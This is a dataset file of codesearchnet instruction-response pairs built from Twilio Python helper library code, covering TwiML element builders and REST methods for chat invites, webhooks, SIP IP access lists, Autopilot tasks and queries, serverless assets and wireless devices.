{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating a SIP element", "response": "def sip(self, sip_url, username=None, password=None, url=None, method=None,\n            status_callback_event=None, status_callback=None,\n            status_callback_method=None, **kwargs):\n        \"\"\"\n        Create a <Sip> element\n\n        :param sip_url: SIP URL\n        :param username: SIP Username\n        :param password: SIP Password\n        :param url: Action URL\n        :param method: Action URL method\n        :param status_callback_event: Status callback events\n        :param status_callback: Status callback URL\n        :param status_callback_method: Status callback URL method\n        :param kwargs: additional attributes\n\n        :returns: <Sip> element\n        \"\"\"\n        return self.nest(Sip(\n            sip_url,\n            username=username,\n            password=password,\n            url=url,\n            method=method,\n            status_callback_event=status_callback_event,\n            status_callback=status_callback,\n            status_callback_method=status_callback_method,\n            **kwargs\n        ))"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncreating a parameter element", "response": "def parameter(self, name=None, value=None, **kwargs):\n        \"\"\"\n        Create a <Parameter> element\n\n        :param name: The name of the custom parameter\n        :param value: The value of the custom parameter\n        :param kwargs: additional attributes\n\n        :returns: <Parameter> element\n        \"\"\"\n        return self.nest(Parameter(name=name, value=value, **kwargs))"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncreates a new room element with the given name and optional participantIdentity.", "response": "def room(self, name, participantIdentity=None, **kwargs):\n        \"\"\"\n        Create a <Room> element\n\n        :param name: Room name\n        :param participantIdentity: Participant identity when connecting to the Room\n        :param kwargs: additional attributes\n\n        :returns: <Room> element\n        \"\"\"\n        return self.nest(Room(name, participantIdentity=participantIdentity, **kwargs))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nfetch a FormInstance :returns: Fetched FormInstance :rtype: twilio.rest.authy.v1.form.FormInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a FormInstance\n\n        :returns: Fetched FormInstance\n        :rtype: twilio.rest.authy.v1.form.FormInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return FormInstance(self._version, payload, form_type=self._solution['form_type'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngenerates an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: FormContext for this FormInstance\n        :rtype: twilio.rest.authy.v1.form.FormContext\n        \"\"\"\n        if self._context is None:\n            self._context = FormContext(self._version, form_type=self._solution['form_type'], )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating a new InviteInstance", "response": "def create(self, identity, role_sid=values.unset):\n        \"\"\"\n        Create a new InviteInstance\n\n        :param unicode identity: The `identity` value that identifies the new resource's User\n        :param unicode role_sid: The Role assigned to the new member\n\n        :returns: Newly created InviteInstance\n        :rtype: twilio.rest.chat.v2.service.channel.invite.InviteInstance\n        \"\"\"\n        data = values.of({'Identity': identity, 'RoleSid': role_sid, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return InviteInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            channel_sid=self._solution['channel_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nconstruct a InviteContext :param sid: The unique string that identifies the resource :returns: twilio.rest.chat.v2.service.channel.invite.InviteContext :rtype: twilio.rest.chat.v2.service.channel.invite.InviteContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a InviteContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.chat.v2.service.channel.invite.InviteContext\n        :rtype: twilio.rest.chat.v2.service.channel.invite.InviteContext\n        \"\"\"\n        return InviteContext(\n            self._version,\n            service_sid=self._solution['service_sid'],\n            channel_sid=self._solution['channel_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_instance(self, payload):\n        return InviteInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            channel_sid=self._solution['channel_sid'],\n        )", "response": "Build an instance of InviteInstance"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return InviteInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            channel_sid=self._solution['channel_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Fetch a InviteInstance\n\n        :returns: Fetched InviteInstance\n        :rtype: twilio.rest.chat.v2.service.channel.invite.InviteInstance"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nconstructing a WebhookContext :param sid: The unique string that identifies the resource :returns: twilio.rest.chat.v2.service.channel.webhook.WebhookContext :rtype: twilio.rest.chat.v2.service.channel.webhook.WebhookContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a WebhookContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.chat.v2.service.channel.webhook.WebhookContext\n        :rtype: twilio.rest.chat.v2.service.channel.webhook.WebhookContext\n        \"\"\"\n        return WebhookContext(\n            self._version,\n            service_sid=self._solution['service_sid'],\n            channel_sid=self._solution['channel_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nbuilds an instance of WebhookInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of WebhookInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.chat.v2.service.channel.webhook.WebhookInstance\n        :rtype: twilio.rest.chat.v2.service.channel.webhook.WebhookInstance\n        \"\"\"\n        return WebhookInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            channel_sid=self._solution['channel_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngenerating an instance context for the crawler", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: WebhookContext for this WebhookInstance\n        :rtype: twilio.rest.chat.v2.service.channel.webhook.WebhookContext\n        \"\"\"\n        if self._context is None:\n            self._context = WebhookContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                channel_sid=self._solution['channel_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nconstructing a IpAddressContext :param sid: A string that identifies the IpAddress resource to fetch :returns: twilio.rest.api.v2010.account.sip.ip_access_control_list.ip_address.IpAddressContext :rtype: twilio.rest.api.v2010.account.sip.ip_access_control_list.ip_address.IpAddressContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a IpAddressContext\n\n        :param sid: A string that identifies the IpAddress resource to fetch\n\n        :returns: twilio.rest.api.v2010.account.sip.ip_access_control_list.ip_address.IpAddressContext\n        :rtype: twilio.rest.api.v2010.account.sip.ip_access_control_list.ip_address.IpAddressContext\n        \"\"\"\n        return IpAddressContext(\n            self._version,\n            account_sid=self._solution['account_sid'],\n            ip_access_control_list_sid=self._solution['ip_access_control_list_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_instance(self, payload):\n        return IpAddressInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            ip_access_control_list_sid=self._solution['ip_access_control_list_sid'],\n        )", "response": "Build an instance of IpAddressInstance"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return IpAddressInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            ip_access_control_list_sid=self._solution['ip_access_control_list_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Fetch a IpAddressInstance\n\n        :returns: Fetched IpAddressInstance\n        :rtype: twilio.rest.api.v2010.account.sip.ip_access_control_list.ip_address.IpAddressInstance"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nupdating the IpAddressInstance :param unicode ip_address: An IP address in dotted decimal notation from which you want to accept traffic. Any SIP requests from this IP address will be allowed by Twilio. IPv4 only supported today. :param unicode friendly_name: A human readable descriptive text for this resource, up to 64 characters long. :param unicode cidr_prefix_length: An integer representing the length of the CIDR prefix to use with this IP address when accepting traffic. By default the entire IP address is used. :returns: Updated IpAddressInstance :rtype: twilio.rest.api.v2010.account.sip.ip_access_control_list.ip_address.IpAddressInstance", "response": "def update(self, ip_address=values.unset, friendly_name=values.unset,\n               cidr_prefix_length=values.unset):\n        \"\"\"\n        Update the IpAddressInstance\n\n        :param unicode ip_address: An IP address in dotted decimal notation from which you want to accept traffic. Any SIP requests from this IP address will be allowed by Twilio. IPv4 only supported today.\n        :param unicode friendly_name: A human readable descriptive text for this resource, up to 64 characters long.\n        :param unicode cidr_prefix_length: An integer representing the length of the CIDR prefix to use with this IP address when accepting traffic. By default the entire IP address is used.\n\n        :returns: Updated IpAddressInstance\n        :rtype: twilio.rest.api.v2010.account.sip.ip_access_control_list.ip_address.IpAddressInstance\n        \"\"\"\n        data = values.of({\n            'IpAddress': ip_address,\n            'FriendlyName': friendly_name,\n            'CidrPrefixLength': cidr_prefix_length,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return IpAddressInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            ip_access_control_list_sid=self._solution['ip_access_control_list_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _proxy(self):\n        if self._context is None:\n            self._context = IpAddressContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                ip_access_control_list_sid=self._solution['ip_access_control_list_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the ipAddressInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nupdates the IpAddressInstance :param unicode ip_address: An IP address in dotted decimal notation from which you want to accept traffic. Any SIP requests from this IP address will be allowed by Twilio. IPv4 only supported today. :param unicode friendly_name: A human readable descriptive text for this resource, up to 64 characters long. :param unicode cidr_prefix_length: An integer representing the length of the CIDR prefix to use with this IP address when accepting traffic. By default the entire IP address is used. :returns: Updated IpAddressInstance :rtype: twilio.rest.api.v2010.account.sip.ip_access_control_list.ip_address.IpAddressInstance", "response": "def update(self, ip_address=values.unset, friendly_name=values.unset,\n               cidr_prefix_length=values.unset):\n        \"\"\"\n        Update the IpAddressInstance\n\n        :param unicode ip_address: An IP address in dotted decimal notation from which you want to accept traffic. Any SIP requests from this IP address will be allowed by Twilio. IPv4 only supported today.\n        :param unicode friendly_name: A human readable descriptive text for this resource, up to 64 characters long.\n        :param unicode cidr_prefix_length: An integer representing the length of the CIDR prefix to use with this IP address when accepting traffic. By default the entire IP address is used.\n\n        :returns: Updated IpAddressInstance\n        :rtype: twilio.rest.api.v2010.account.sip.ip_access_control_list.ip_address.IpAddressInstance\n        \"\"\"\n        return self._proxy.update(\n            ip_address=ip_address,\n            friendly_name=friendly_name,\n            cidr_prefix_length=cidr_prefix_length,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef create(self, unique_name, friendly_name=values.unset, actions=values.unset,\n               actions_url=values.unset):\n        \"\"\"\n        Create a new TaskInstance\n\n        :param unicode unique_name: An application-defined string that uniquely identifies the resource\n        :param unicode friendly_name:  descriptive string that you create to describe the new resource\n        :param dict actions: The JSON string that specifies the actions that instruct the Assistant on how to perform the task\n        :param unicode actions_url: The URL from which the Assistant can fetch actions\n\n        :returns: Newly created TaskInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.task.TaskInstance\n        \"\"\"\n        data = values.of({\n            'UniqueName': unique_name,\n            'FriendlyName': friendly_name,\n            'Actions': serialize.object(actions),\n            'ActionsUrl': actions_url,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return TaskInstance(self._version, payload, assistant_sid=self._solution['assistant_sid'], )", "response": "Create a new TaskInstance"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nconstruct a TaskContext :param sid: The unique string that identifies the resource to fetch :returns: twilio.rest.autopilot.v1.assistant.task.TaskContext :rtype: twilio.rest.autopilot.v1.assistant.task.TaskContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a TaskContext\n\n        :param sid: The unique string that identifies the resource to fetch\n\n        :returns: twilio.rest.autopilot.v1.assistant.task.TaskContext\n        :rtype: twilio.rest.autopilot.v1.assistant.task.TaskContext\n        \"\"\"\n        return TaskContext(self._version, assistant_sid=self._solution['assistant_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_instance(self, payload):\n        return TaskInstance(self._version, payload, assistant_sid=self._solution['assistant_sid'], )", "response": "Build an instance of TaskInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef fields(self):\n        if self._fields is None:\n            self._fields = FieldList(\n                self._version,\n                assistant_sid=self._solution['assistant_sid'],\n                task_sid=self._solution['sid'],\n            )\n        return self._fields", "response": "Access the fields\n\n        :returns: twilio.rest.autopilot.v1.assistant.task.field.FieldList\n        :rtype: twilio.rest.autopilot.v1.assistant.task.field.FieldList"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef samples(self):\n        if self._samples is None:\n            self._samples = SampleList(\n                self._version,\n                assistant_sid=self._solution['assistant_sid'],\n                task_sid=self._solution['sid'],\n            )\n        return self._samples", "response": "Access the samples\n\n        :returns: twilio.rest.autopilot.v1.assistant.task.sample.SampleList\n        :rtype: twilio.rest.autopilot.v1.assistant.task.sample.SampleList"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\naccess the task_actions :returns: twilio.rest.autopilot.v1.assistant.task.task_actions.TaskActionsList :rtype: twilio.rest.autopilot.v1.assistant.task.task_actions.TaskActionsList", "response": "def task_actions(self):\n        \"\"\"\n        Access the task_actions\n\n        :returns: twilio.rest.autopilot.v1.assistant.task.task_actions.TaskActionsList\n        :rtype: twilio.rest.autopilot.v1.assistant.task.task_actions.TaskActionsList\n        \"\"\"\n        if self._task_actions is None:\n            self._task_actions = TaskActionsList(\n                self._version,\n                assistant_sid=self._solution['assistant_sid'],\n                task_sid=self._solution['sid'],\n            )\n        return self._task_actions"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\naccesses the statistics :returns: twilio.rest.autopilot.v1.assistant.task.task_statistics.TaskStatisticsList :rtype: twilio.rest.autopilot.v1.assistant.task.task_statistics.TaskStatisticsList", "response": "def statistics(self):\n        \"\"\"\n        Access the statistics\n\n        :returns: twilio.rest.autopilot.v1.assistant.task.task_statistics.TaskStatisticsList\n        :rtype: twilio.rest.autopilot.v1.assistant.task.task_statistics.TaskStatisticsList\n        \"\"\"\n        if self._statistics is None:\n            self._statistics = TaskStatisticsList(\n                self._version,\n                assistant_sid=self._solution['assistant_sid'],\n                task_sid=self._solution['sid'],\n            )\n        return self._statistics"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _proxy(self):\n        if self._context is None:\n            self._context = TaskContext(\n                self._version,\n                assistant_sid=self._solution['assistant_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the resource we are interested in"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef update(self, friendly_name=values.unset, unique_name=values.unset,\n               actions=values.unset, actions_url=values.unset):\n        \"\"\"\n        Update the TaskInstance\n\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode unique_name: An application-defined string that uniquely identifies the resource\n        :param dict actions: The JSON string that specifies the actions that instruct the Assistant on how to perform the task\n        :param unicode actions_url: The URL from which the Assistant can fetch actions\n\n        :returns: Updated TaskInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.task.TaskInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name=friendly_name,\n            unique_name=unique_name,\n            actions=actions,\n            actions_url=actions_url,\n        )", "response": "Updates the TaskInstance\n        resource"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef create(self, friendly_name):\n        data = values.of({'FriendlyName': friendly_name, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return AssetInstance(self._version, payload, service_sid=self._solution['service_sid'], )", "response": "Create a new AssetInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nconstruct a AssetContext :param sid: The sid :returns: twilio.rest.serverless.v1.service.asset.AssetContext :rtype: twilio.rest.serverless.v1.service.asset.AssetContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a AssetContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.serverless.v1.service.asset.AssetContext\n        :rtype: twilio.rest.serverless.v1.service.asset.AssetContext\n        \"\"\"\n        return AssetContext(self._version, service_sid=self._solution['service_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nbuilds an instance of AssetInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of AssetInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.serverless.v1.service.asset.AssetInstance\n        :rtype: twilio.rest.serverless.v1.service.asset.AssetInstance\n        \"\"\"\n        return AssetInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef asset_versions(self):\n        if self._asset_versions is None:\n            self._asset_versions = AssetVersionList(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                asset_sid=self._solution['sid'],\n            )\n        return self._asset_versions", "response": "Access the asset_versions\n\n        :returns: twilio.rest.serverless.v1.service.asset.asset_version.AssetVersionList\n        :rtype: twilio.rest.serverless.v1.service.asset.asset_version.AssetVersionList"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngenerating an instance context for the asset", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: AssetContext for this AssetInstance\n        :rtype: twilio.rest.serverless.v1.service.asset.AssetContext\n        \"\"\"\n        if self._context is None:\n            self._context = AssetContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef list(self, language=values.unset, model_build=values.unset,\n             status=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Lists QueryInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param unicode language: The ISO language-country string that specifies the language used by the Query resources to read\n        :param unicode model_build: The SID or unique name of the Model Build to be queried\n        :param unicode status: The status of the resources to read\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.autopilot.v1.assistant.query.QueryInstance]\n        \"\"\"\n        return list(self.stream(\n            language=language,\n            model_build=model_build,\n            status=status,\n            limit=limit,\n            page_size=page_size,\n        ))", "response": "Streams the QueryInstance records from the API as a list."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nretrieve a single page of QueryInstance records from the API.", "response": "def page(self, language=values.unset, model_build=values.unset,\n             status=values.unset, page_token=values.unset, page_number=values.unset,\n             page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of QueryInstance records from the API.\n        Request is executed immediately\n\n        :param unicode language: The ISO language-country string that specifies the language used by the Query resources to read\n        :param unicode model_build: The SID or unique name of the Model Build to be queried\n        :param unicode status: The status of the resources to read\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of QueryInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.query.QueryPage\n        \"\"\"\n        params = values.of({\n            'Language': language,\n            'ModelBuild': model_build,\n            'Status': status,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return QueryPage(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get(self, sid):\n        return QueryContext(self._version, assistant_sid=self._solution['assistant_sid'], sid=sid, )", "response": "Constructs a QueryContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.autopilot.v1.assistant.query.QueryContext\n        :rtype: twilio.rest.autopilot.v1.assistant.query.QueryContext"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nbuilding an instance of QueryInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of QueryInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.autopilot.v1.assistant.query.QueryInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.query.QueryInstance\n        \"\"\"\n        return QueryInstance(self._version, payload, assistant_sid=self._solution['assistant_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nupdate the QueryInstance :param unicode sample_sid: The SID of an optional reference to the Sample created from the query :param unicode status: The new status of the resource :returns: Updated QueryInstance :rtype: twilio.rest.autopilot.v1.assistant.query.QueryInstance", "response": "def update(self, sample_sid=values.unset, status=values.unset):\n        \"\"\"\n        Update the QueryInstance\n\n        :param unicode sample_sid: The SID of an optional reference to the Sample created from the query\n        :param unicode status: The new status of the resource\n\n        :returns: Updated QueryInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.query.QueryInstance\n        \"\"\"\n        data = values.of({'SampleSid': sample_sid, 'Status': status, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return QueryInstance(\n            self._version,\n            payload,\n            assistant_sid=self._solution['assistant_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ngenerate an instance context for the resource we are interested in", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: QueryContext for this QueryInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.query.QueryContext\n        \"\"\"\n        if self._context is None:\n            self._context = QueryContext(\n                self._version,\n                assistant_sid=self._solution['assistant_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nupdate the QueryInstance :param unicode sample_sid: The SID of an optional reference to the Sample created from the query :param unicode status: The new status of the resource :returns: Updated QueryInstance :rtype: twilio.rest.autopilot.v1.assistant.query.QueryInstance", "response": "def update(self, sample_sid=values.unset, status=values.unset):\n        \"\"\"\n        Update the QueryInstance\n\n        :param unicode sample_sid: The SID of an optional reference to the Sample created from the query\n        :param unicode status: The new status of the resource\n\n        :returns: Updated QueryInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.query.QueryInstance\n        \"\"\"\n        return self._proxy.update(sample_sid=sample_sid, status=status, )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\naccess the InstalledAddOnList Twilio Domain", "response": "def installed_add_ons(self):\n        \"\"\"\n        :rtype: twilio.rest.preview.marketplace.installed_add_on.InstalledAddOnList\n        \"\"\"\n        if self._installed_add_ons is None:\n            self._installed_add_ons = InstalledAddOnList(self)\n        return self._installed_add_ons"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef available_add_ons(self):\n        if self._available_add_ons is None:\n            self._available_add_ons = AvailableAddOnList(self)\n        return self._available_add_ons", "response": "Access the AvailableAddOnList for this Marketplace"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\naccess the CommandList Twilio Domain", "response": "def commands(self):\n        \"\"\"\n        :rtype: twilio.rest.wireless.v1.command.CommandList\n        \"\"\"\n        if self._commands is None:\n            self._commands = CommandList(self)\n        return self._commands"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\naccess the Rate Plans Twilio Domain", "response": "def rate_plans(self):\n        \"\"\"\n        :rtype: twilio.rest.wireless.v1.rate_plan.RatePlanList\n        \"\"\"\n        if self._rate_plans is None:\n            self._rate_plans = RatePlanList(self)\n        return self._rate_plans"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\naccessing the SimList Twilio Domain", "response": "def sims(self):\n        \"\"\"\n        :rtype: twilio.rest.wireless.v1.sim.SimList\n        \"\"\"\n        if self._sims is None:\n            self._sims = SimList(self)\n        return self._sims"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncreate a new DeviceInstance", "response": "def create(self, unique_name=values.unset, friendly_name=values.unset,\n               identity=values.unset, deployment_sid=values.unset,\n               enabled=values.unset):\n        \"\"\"\n        Create a new DeviceInstance\n\n        :param unicode unique_name: A unique, addressable name of this Device.\n        :param unicode friendly_name: A human readable description for this Device.\n        :param unicode identity: An identifier of the Device user.\n        :param unicode deployment_sid: The unique SID of the Deployment group.\n        :param bool enabled: The enabled\n\n        :returns: Newly created DeviceInstance\n        :rtype: twilio.rest.preview.deployed_devices.fleet.device.DeviceInstance\n        \"\"\"\n        data = values.of({\n            'UniqueName': unique_name,\n            'FriendlyName': friendly_name,\n            'Identity': identity,\n            'DeploymentSid': deployment_sid,\n            'Enabled': enabled,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return DeviceInstance(self._version, payload, fleet_sid=self._solution['fleet_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nstreaming DeviceInstance records from the API as a list.", "response": "def list(self, deployment_sid=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Lists DeviceInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param unicode deployment_sid: Find all Devices grouped under the specified Deployment.\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.preview.deployed_devices.fleet.device.DeviceInstance]\n        \"\"\"\n        return list(self.stream(deployment_sid=deployment_sid, limit=limit, page_size=page_size, ))"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nconstructing a DeviceContext :param sid: A string that uniquely identifies the Device. :returns: twilio.rest.preview.deployed_devices.fleet.device.DeviceContext :rtype: twilio.rest.preview.deployed_devices.fleet.device.DeviceContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a DeviceContext\n\n        :param sid: A string that uniquely identifies the Device.\n\n        :returns: twilio.rest.preview.deployed_devices.fleet.device.DeviceContext\n        :rtype: twilio.rest.preview.deployed_devices.fleet.device.DeviceContext\n        \"\"\"\n        return DeviceContext(self._version, fleet_sid=self._solution['fleet_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nbuild an instance of DeviceInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of DeviceInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.preview.deployed_devices.fleet.device.DeviceInstance\n        :rtype: twilio.rest.preview.deployed_devices.fleet.device.DeviceInstance\n        \"\"\"\n        return DeviceInstance(self._version, payload, fleet_sid=self._solution['fleet_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef update(self, friendly_name=values.unset, identity=values.unset,\n               deployment_sid=values.unset, enabled=values.unset):\n        \"\"\"\n        Update the DeviceInstance\n\n        :param unicode friendly_name: A human readable description for this Device.\n        :param unicode identity: An identifier of the Device user.\n        :param unicode deployment_sid: The unique SID of the Deployment group.\n        :param bool enabled: The enabled\n\n        :returns: Updated DeviceInstance\n        :rtype: twilio.rest.preview.deployed_devices.fleet.device.DeviceInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'Identity': identity,\n            'DeploymentSid': deployment_sid,\n            'Enabled': enabled,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return DeviceInstance(\n            self._version,\n            payload,\n            fleet_sid=self._solution['fleet_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Update the DeviceInstance\n\n        :param unicode friendly_name: A human readable description for this Device.\n        :param unicode identity: An identifier of the Device user.\n        :param unicode deployment_sid: The unique SID of the Deployment group.\n        :param bool enabled: The enabled\n\n        :returns: Updated DeviceInstance\n        :rtype: twilio.rest.preview.deployed_devices.fleet.device.DeviceInstance"}
